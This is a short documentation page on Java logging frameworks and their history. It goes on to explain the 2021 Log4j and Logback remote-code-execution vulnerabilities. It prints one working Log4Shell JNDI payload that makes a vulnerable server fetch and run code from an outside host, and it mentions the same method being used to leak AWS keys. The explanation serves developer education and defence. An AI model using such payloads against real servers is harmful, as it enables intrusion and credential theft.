---
title: Logging
sidebar_position: 2
---

Java developers have a large number of choices for logging:

 * System Logger - introduced in Java 9 (2017), an API that acts as a facade to other loggers.
 * JUL - Introduced in Java 1.4 (2002), the Java Util Logger, is generally available.
 * Log4j
    * Log4j2 - Released in 2014, a fast logging framework.
    * Log4j - Released in 2001 and end-of-lifed in 2015.
 * Logback
    * Logback - Released 2006, intended as a successor of log4j.
    * SLF4J - Released 2005, a simple logging facade. This does not provide a logger, it provides a single API that can consolidate the other loggers.
 * Apache Commong-Logging - Released in 2002 and end-of-lifed in 2014.
 * TinyLogger - Released in 2012, a fast logging framework.

Many Java applications include more that one logger. In a [2020 study by York University](https://nemo9cby.github.io/resources/pubs/icse2020_chen.pdf), researchers identified that Hadoop used six loggers and IntelliJ used twelve.

## Logging Vulnerabilities

The main type of vulnerability that impacts logs it [Log Injection](../../vulnerabilities/log-injection.md).

In 2021, the logging framework Log4j, [Log4J2](https://nvd.nist.gov/vuln/detail/CVE-2021-45046), and [Logback](https://cve.report/CVE-2021-42550) were vulnerable to [Remote Code Execution](../../vulnerabilities/remote-code-execution.md), allowing attackers to take control over these servers when they logged user input. The vulnerable versions of log4j spanned from 2014 to 2021. Attackers could craft input that caused the application to load and execute remote classes over JNDI.

```
${jndi:rmi://192.168.2.106:1099/vccvhr}
```

When a server with a vulnerable Log4j writes that String to a log, it loads the remote code from the host and executes it. Attackers took advantage of this in two ways:

 1. Compromising the server to run code and steal data.
 2. Expanding environment variables in the URL's hostname, to read sensitive data like AWS keys.